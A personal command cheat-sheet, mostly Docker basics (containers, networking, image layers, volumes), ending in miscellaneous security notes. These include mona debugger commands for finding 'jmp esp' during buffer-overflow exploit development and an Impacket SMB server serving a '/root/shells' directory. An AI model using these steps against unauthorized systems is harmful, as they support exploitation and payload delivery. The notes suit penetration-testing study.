docker logs [container id]


// docker inspect which views all info about a container
docker inspect [container id]


//create my first container
docker create -it --name mycontainer centos:6.8 /bin/bash




// stop a container
docker stop web




// stop a running container with a KILL signal
docker kill web




//create a new bash inside a container
docker exec -it web bash


// print last 100 of the container logs
docker logs --tail 100 web












// what does it do :
docker container run --publish 80:80 nginx
        download image nginx from docker hub
        start a new container from that image
        open port 80 on the host ip
        route the traffic to the container ip, port 80.



what happens exactly:
1. Looks for that image locally in image cache, doesn't find anything
2. Then looks in remote image repository (defaults to Docker Hub)
3. Downloads the latest version (nginx:latest by default)
4. Creates new container based on that image and prepares to start
5. Gives it a virtual IP on a private network inside docker engine
6. Opens up port 80 on host and forwards to port 80 in container
7. Starts container by using the CMD in the image Dockerfile


Docker Networking
=================
defaults:
        each container will be connected to a private virtual network "bridge"
        each virtual network routes through NAT firewall on host IP.
        All containers on a virtual network can talk to each other.
        best practice is to create a new virtual network for each app.




1- Bridge
is the default network that bridges from the default network through the NAT firewall to the physical network.


2- Host network
Skips the virtual networking of docker and attaches the container to the network of the physical interface. Gains performance by skipping virtual networks but sacrifices security of container model.


3- None Network:
attached to nothing at all.


4- overlay: Overlay networks connect multiple Docker daemons together and enable swarm services to communicate with each other. You can also use overlay networks to facilitate communication between a swarm service and a standalone container, or between two standalone containers on different Docker daemons. This strategy removes the need to do OS-level routing between these containers. See overlay networks.






// create an overlay network
docker network create --subnet 10.1.0.0/24 --gateway 10.1.0.1 -d overlay mynet




// list the networks
docker network ls




// inspect a network
docker network inspect


//attach a network to a container
docker network connect


// detath a network from a container
docker network disconnect


//View the port redirected to the container
docker container port [contianer name]




// when creating a network. Note that the default driver is bridge
// you can see that with docker network ls




//The newly create network can be passed to the container once created with the option --network




Docker Networks DNS
===================
When created on a special network, all containers in that network will get a special DNS resolution so that they can be accessed by their names from within all containers inside that network segment.


The default bridge network does not have that feature


//create a container with a net alias
docker container run -d --net dude --net-alias search elasticsearch:2


// if you do nslookup on search it should return the ip address assigned to the container












Docker Images
==============
The building blocks of containers
What is in an image?
What is not in an image?
How to find images?
Building your own images




What is in an image?
App binaries and dependencies.
Metadata about the image data and how to run the image.


official definition:
it is an ordered collection of root filesystem changes and the corresponding execution parameters use within
a container runtime.




image  layers


History of the image layers


Every change happens to an image is accounted for a layer




You can see above that we have two containers relying on the same jessie layer. So we do not need to create that one again. This is the concept of layers. Each layer has its own unique hash so we can keep track of it.


We are never storing the data for the same image more than once on our file system which is a big benefit of the layer approach.






IMAGE TAG
==========
assigns one or more tags to an image




Note: official one will start with just the name and no slashes.
What a Tag is ?
A pointer to a specific image commit.


an official image has no slash part. just the name of the image
non official images will have  [repo-name]/image-name:[image-tag]






DOCKER VOLUMES:
================
Ideally the container should not mix the app data with binaries and other files needed to run the container. This is called separation of concerns.




Container data by default will only be removed when we remove the container and not when we stop it.




VOlumes vs Bind Mounts


volumes:makes special location outside of container UFS
Bind mounts: link container path to host path


Volumes:
"Volumes" : {
"/var/lib/mysql": {}
},




Using the -v option we can do three things:
1- make the container use an existing volume.
2- create a new volume the same way it was doing it from the config file.
3- create a named volume:


-v mysql-db:/var/lib/mysql                                         Volume labels
-v /home/malhyari:/home/alex                                 Bind mounts




Docker Volume Create










=====================
disable file globbing
echo '*'                                // enclose the special character inside single quotes




======================
mona immunity debugger addon




!mona modules                                                                                 // list all modules in an executable
!mona jmp -r esp                                                                        // find jmp esp instruction


============================================
assemble via nasm
nasm -f elf32 test.asm -o test.o
link via ld
ld test.o -o test


===========================================
test linux disk speed with dd
dd if=/dev/zero of=/tmp/test1.img bs=1G count=1 oflag=dsync


===========================================
fix kali rep gpg errors
wget -q -O - https://archive.kali.org/archive-key.asc  | apt-key add


invalid signature error


kali upgrade
apt update apt upgrade


=====================================================
python smb server one line
install the package Impacket
# python smbserver.py ROPNOP /root/shells